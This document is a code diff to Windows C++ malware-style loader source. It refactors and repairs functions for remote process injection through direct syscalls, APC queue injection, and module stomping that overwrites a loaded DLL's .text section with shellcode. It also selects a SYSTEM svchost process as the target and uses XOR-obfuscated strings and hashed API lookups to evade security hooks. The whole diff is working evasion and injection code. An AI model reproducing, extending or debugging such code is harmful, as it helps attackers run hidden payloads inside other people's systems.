@@ -92,73 +92,77 @@ BOOL SpawnWithPPID(const wchar_t* targetPath, DWORD parentPid, HANDLE* hProcessO
 }
 
 // ============================================================
+// Inline helpers — syscall with Win32 fallback for optional entries.
+// ============================================================
+static HANDLE OpenTarget(DWORD pid, DWORD access) {
+    if (g_Syscalls.NtOpenProcess) {
+        CLIENT_ID cid = {};
+        cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
+        OBJECT_ATTRIBUTES oa = {};
+        InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
+        HANDLE h = nullptr;
+        if (g_Syscalls.NtOpenProcess(&h, access, &oa, &cid) == 0) return h;
+        return nullptr;
+    }
+    return OpenProcess(access, FALSE, pid);
+}
+
+static void CloseTarget(HANDLE h) {
+    if (!h) return;
+    if (g_Syscalls.NtClose) g_Syscalls.NtClose(h);
+    else CloseHandle(h);
+}
+
+static HANDLE CreateRemoteThreadFallback(HANDLE hProc, PVOID startAddr) {
+    if (g_Syscalls.NtCreateThreadEx) {
+        HANDLE hThread = nullptr;
+        g_Syscalls.NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, nullptr,
+                                    hProc, startAddr, nullptr, 0, 0, 0, 0, nullptr);
+        return hThread;
+    }
+    return CreateRemoteThread(hProc, nullptr, 0,
+                              reinterpret_cast<LPTHREAD_START_ROUTINE>(startAddr),
+                              nullptr, 0, nullptr);
+}
+
+// ============================================================
 // Remote process injection via direct syscall chain.
-// No Win32 VM/thread APIs — bypasses IAT hooks on those calls.
+// Optional syscalls fall back to Win32 equivalents if NULL.
 // ============================================================
 BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload,
                          SIZE_T payloadSize, HANDLE* hThreadOut) {
     if (!payload || payloadSize == 0) return FALSE;
 
-    // 1. Open target process
-    CLIENT_ID cid = {};
-    cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
-
-    OBJECT_ATTRIBUTES oa = {};
-    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
-
-    HANDLE hProc = nullptr;
-    NTSTATUS st = g_Syscalls.NtOpenProcess(
-        &hProc,
-        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
-        &oa, &cid);
-    if (st != 0 || !hProc) return FALSE;
+    HANDLE hProc = OpenTarget(pid,
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD);
+    if (!hProc) return FALSE;
 
     // 2. Allocate RW region
     PVOID  base   = nullptr;
     SIZE_T region = payloadSize;
-    st = g_Syscalls.NtAllocateVirtualMemory(
+    NTSTATUS st = g_Syscalls.NtAllocateVirtualMemory(
         hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (st != 0) { g_Syscalls.NtClose(hProc); return FALSE; }
+    if (st != 0) { CloseTarget(hProc); return FALSE; }
 
     // 3. Write payload
     SIZE_T written = 0;
     st = g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written);
-    if (st != 0 || written != payloadSize) {
-        g_Syscalls.NtClose(hProc);
-        return FALSE;
-    }
+    if (st != 0 || written != payloadSize) { CloseTarget(hProc); return FALSE; }
 
     // 4. Flip to RX
     ULONG oldProt = 0;
     st = g_Syscalls.NtProtectVirtualMemory(
         hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt);
-    if (st != 0) { g_Syscalls.NtClose(hProc); return FALSE; }
+    if (st != 0) { CloseTarget(hProc); return FALSE; }
 
-    // 5. Create remote thread at payload start
-    HANDLE hThread = nullptr;
-    st = g_Syscalls.NtCreateThreadEx(
-        &hThread,
-        THREAD_ALL_ACCESS,
-        nullptr,
-        hProc,
-        base,          // start address = payload base
-        nullptr,       // parameter
-        0,             // flags (0 = run immediately)
-        0, 0, 0,       // zero, stack commit, stack reserve
-        nullptr);
+    // 5. Create remote thread
+    HANDLE hThread = CreateRemoteThreadFallback(hProc, base);
+    if (!hThread) { CloseTarget(hProc); return FALSE; }
 
-    if (st != 0) {
-        g_Syscalls.NtClose(hProc);
-        return FALSE;
-    }
+    if (hThreadOut) *hThreadOut = hThread;
+    else            CloseTarget(hThread);
 
-    if (hThreadOut) {
-        *hThreadOut = hThread;
-    } else {
-        g_Syscalls.NtClose(hThread);
-    }
-
-    g_Syscalls.NtClose(hProc);
+    CloseTarget(hProc);
     return TRUE;
 }
 
@@ -167,37 +171,32 @@ BOOL InjectRemoteProcess(DWORD pid, const BYTE* payload,
 // ============================================================
 BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
     if (!payload || payloadSize == 0) return FALSE;
+    // APC injection requires NtSuspendThread/NtResumeThread/NtQueueApcThread;
+    // fall back to a no-op if any are unavailable.
+    if (!g_Syscalls.NtSuspendThread || !g_Syscalls.NtResumeThread || !g_Syscalls.NtQueueApcThread)
+        return FALSE;
 
-    CLIENT_ID cid = {};
-    cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
-    OBJECT_ATTRIBUTES oa = {};
-    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
-
-    HANDLE hProc = nullptr;
-    NTSTATUS st = g_Syscalls.NtOpenProcess(
-        &hProc, PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
-        &oa, &cid);
-    if (st != 0 || !hProc) return FALSE;
+    HANDLE hProc = OpenTarget(pid,
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD);
+    if (!hProc) return FALSE;
 
     PVOID base = nullptr;
     SIZE_T region = payloadSize;
-    st = g_Syscalls.NtAllocateVirtualMemory(
+    NTSTATUS st = g_Syscalls.NtAllocateVirtualMemory(
         hProc, &base, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (st != 0) { g_Syscalls.NtClose(hProc); return FALSE; }
+    if (st != 0) { CloseTarget(hProc); return FALSE; }
 
     SIZE_T written = 0;
     st = g_Syscalls.NtWriteVirtualMemory(hProc, base, (PVOID)payload, payloadSize, &written);
-    if (st != 0 || written != payloadSize) {
-        g_Syscalls.NtClose(hProc); return FALSE;
-    }
+    if (st != 0 || written != payloadSize) { CloseTarget(hProc); return FALSE; }
 
     ULONG oldProt = 0;
     st = g_Syscalls.NtProtectVirtualMemory(
         hProc, &base, &region, PAGE_EXECUTE_READ, &oldProt);
-    if (st != 0) { g_Syscalls.NtClose(hProc); return FALSE; }
+    if (st != 0) { CloseTarget(hProc); return FALSE; }
 
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
-    if (!hKernel32) { g_Syscalls.NtClose(hProc); return FALSE; }
+    if (!hKernel32) { CloseTarget(hProc); return FALSE; }
 
     auto _CreateToolhelp32Snapshot = HASHPROC(hKernel32, CreateToolhelp32Snapshot);
     auto _Thread32First = HASHPROC(hKernel32, Thread32First);
@@ -206,11 +205,11 @@ BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
     auto _CloseHandle = HASHPROC(hKernel32, CloseHandle);
 
     if (!_CreateToolhelp32Snapshot || !_Thread32First || !_Thread32Next || !_OpenThread || !_CloseHandle) {
-        g_Syscalls.NtClose(hProc); return FALSE;
+        CloseTarget(hProc); return FALSE;
     }
 
     HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (snap == INVALID_HANDLE_VALUE) { g_Syscalls.NtClose(hProc); return FALSE; }
+    if (snap == INVALID_HANDLE_VALUE) { CloseTarget(hProc); return FALSE; }
 
     THREADENTRY32 te = {};
     te.dwSize = sizeof(te);
@@ -225,8 +224,9 @@ BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
                 if (hThread) {
                     ULONG suspendCount = 0;
                     g_Syscalls.NtSuspendThread(hThread, &suspendCount);
-                    
-                    st = g_Syscalls.NtQueueApcThread(hThread, base, nullptr, nullptr, nullptr);
+                    st = g_Syscalls.NtQueueApcThread(
+                        hThread, reinterpret_cast<PVOID>(base),
+                        nullptr, nullptr, nullptr);
                     if (st == 0) {
                         queued = TRUE;
                         g_Syscalls.NtResumeThread(hThread, &suspendCount);
@@ -239,9 +239,9 @@ BOOL InjectViaApc(DWORD pid, const BYTE* payload, SIZE_T payloadSize) {
             }
         } while (_Thread32Next(snap, &te));
     }
-    
+
     _CloseHandle(snap);
-    g_Syscalls.NtClose(hProc);
+    CloseTarget(hProc);
     return queued;
 }
 
@@ -267,13 +267,10 @@ BOOL StompModule(DWORD pid, const wchar_t* dllPath,
     OBJECT_ATTRIBUTES oa = {};
     InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
 
-    HANDLE hProc = nullptr;
-    NTSTATUS st = g_Syscalls.NtOpenProcess(
-        &hProc,
+    HANDLE hProc = OpenTarget(pid,
         PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ |
-        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD,
-        &oa, &cid);
-    if (st != 0 || !hProc) return FALSE;
+        PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD);
+    if (!hProc) return FALSE;
 
     // 2. Find module base in remote process via TH32CS_SNAPMODULE
     HMODULE remoteBase = nullptr;
@@ -296,7 +293,7 @@ BOOL StompModule(DWORD pid, const wchar_t* dllPath,
     }
 
     if (!remoteBase) {
-        g_Syscalls.NtClose(hProc);
+        CloseTarget(hProc);
         return FALSE;
     }
 
@@ -305,27 +302,20 @@ BOOL StompModule(DWORD pid, const wchar_t* dllPath,
     SIZE_T rdBytes = 0;
 
     auto hKernel32 = GetModuleHandleA(XS("kernel32.dll"));
-    if (!hKernel32) { g_Syscalls.NtClose(hProc); return FALSE; }
+    if (!hKernel32) { CloseTarget(hProc); return FALSE; }
     auto _ReadProcessMemory = HASHPROC(hKernel32, ReadProcessMemory);
-    if (!_ReadProcessMemory) { g_Syscalls.NtClose(hProc); return FALSE; }
+    if (!_ReadProcessMemory) { CloseTarget(hProc); return FALSE; }
 
     // Read via ReadProcessMemory (it's just a wrapper; fine here since we're
     // in injection context and not the syscall-sensitive critical path)
     if (!_ReadProcessMemory(hProc, remoteBase, headerBuf, sizeof(headerBuf), &rdBytes)) {
-        g_Syscalls.NtClose(hProc);
-        return FALSE;
+        CloseTarget(hProc); return FALSE;
     }
 
     auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(headerBuf);
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
-        g_Syscalls.NtClose(hProc);
-        return FALSE;
-    }
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { CloseTarget(hProc); return FALSE; }
     auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(headerBuf + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE) {
-        g_Syscalls.NtClose(hProc);
-        return FALSE;
-    }
+    if (nt->Signature != IMAGE_NT_SIGNATURE)  { CloseTarget(hProc); return FALSE; }
 
     // Find .text section
     PVOID  textVa   = nullptr;
@@ -341,36 +331,25 @@ BOOL StompModule(DWORD pid, const wchar_t* dllPath,
         }
     }
 
-    if (!textVa || textSize < shellcodeSize) {
-        g_Syscalls.NtClose(hProc);
-        return FALSE;
-    }
+    if (!textVa || textSize < shellcodeSize) { CloseTarget(hProc); return FALSE; }
 
     // 4. RW → write shellcode → RX
     ULONG oldProt = 0;
     st = g_Syscalls.NtProtectVirtualMemory(
         hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProt);
-    if (st != 0) { g_Syscalls.NtClose(hProc); return FALSE; }
+    if (st != 0) { CloseTarget(hProc); return FALSE; }
 
     SIZE_T writ = 0;
     st = g_Syscalls.NtWriteVirtualMemory(hProc, textVa, (PVOID)shellcode, shellcodeSize, &writ);
-    if (st != 0 || writ != shellcodeSize) {
-        g_Syscalls.NtClose(hProc);
-        return FALSE;
-    }
+    if (st != 0 || writ != shellcodeSize) { CloseTarget(hProc); return FALSE; }
 
     ULONG dummy = 0;
-    g_Syscalls.NtProtectVirtualMemory(
-        hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READ, &dummy);
+    g_Syscalls.NtProtectVirtualMemory(hProc, &textVa, &shellcodeSize, PAGE_EXECUTE_READ, &dummy);
 
     // 5. Create thread at stomped .text base
-    HANDLE hThread = nullptr;
-    g_Syscalls.NtCreateThreadEx(
-        &hThread, THREAD_ALL_ACCESS, nullptr,
-        hProc, textVa, nullptr, 0, 0, 0, 0, nullptr);
-
-    if (hThread) g_Syscalls.NtClose(hThread);
-    g_Syscalls.NtClose(hProc);
+    HANDLE hThread = CreateRemoteThreadFallback(hProc, textVa);
+    if (hThread) CloseTarget(hThread);
+    CloseTarget(hProc);
     return (hThread != nullptr);
 }
 
@@ -407,11 +386,14 @@ DWORD FindBestSvchost() {
     DWORD bestPid   = 0;
     DWORD lowestPid = DWORD(-1);
 
-    auto svc = XSW(L"svchost.exe");
+    // Decode once before the loop — XorStr::str() XORs buf in-place, so
+    // calling it on every iteration re-encrypts and produces garbage.
+    wchar_t svcName[16] = {};
+    { auto tmp = XSW(L"svchost.exe"); wcsncpy_s(svcName, tmp.str(), _TRUNCATE); }
 
     if (_Process32FirstW(snap, &pe)) {
         do {
-            if (_wcsicmp(pe.szExeFile, svc.str()) != 0) continue;
+            if (_wcsicmp(pe.szExeFile, svcName) != 0) continue;
 
             // Check if it runs as SYSTEM via token
             HANDLE hProc = _OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
